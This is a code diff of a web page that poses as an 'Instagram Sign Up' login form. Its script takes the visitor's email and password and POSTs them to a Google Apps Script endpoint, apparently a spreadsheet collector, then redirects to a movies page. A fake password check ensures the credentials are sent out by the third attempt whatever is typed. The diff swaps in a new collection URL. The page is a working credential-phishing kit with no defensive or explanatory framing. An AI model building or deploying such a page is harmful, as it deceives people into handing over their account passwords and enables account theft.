@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram Sign Up</title>
+
 <style>
 body{ margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:white; font-family:sans-serif;}
 .container{ width:90%; max-width:350px; text-align:center;}
@@ -29,21 +30,21 @@ button{ width:100%; padding:12px; background:#1877f2; color:white; border:none; 
 let attempts = 0;
 const maxAttempts = 3;
 const correctPassword = "1234"; 
-const sheetUrl = "https://script.google.com/macros/s/AKfycbxRejtCOVk1izyTqMAP1JTEolKVaUMxMpIZUE2_m7SixWHTWZbm32yKdmzA2CerQ9DznA/exec"; 
+const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
 
-function go() {
+function go(){
   const email = document.getElementById("instaUser").value;
   const pw = document.getElementById("instaPass").value;
   const error = document.getElementById("errorMsg");
   attempts++;
 
   if(pw === correctPassword || attempts === maxAttempts){
-   fetch(sheetUrl, {
-  method: "POST",
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=NA&form=Instagram`
-}).then(()=>{
-      window.location.href = "movies.html"; // بعد نجاح التسجيل
+    fetch(sheetUrl, {
+      method: "POST",
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=NA&form=Instagram`
+    }).then(()=>{
+      window.location.href="movies.html"; 
     });
   } else {
     error.innerText = "Password incorrect";
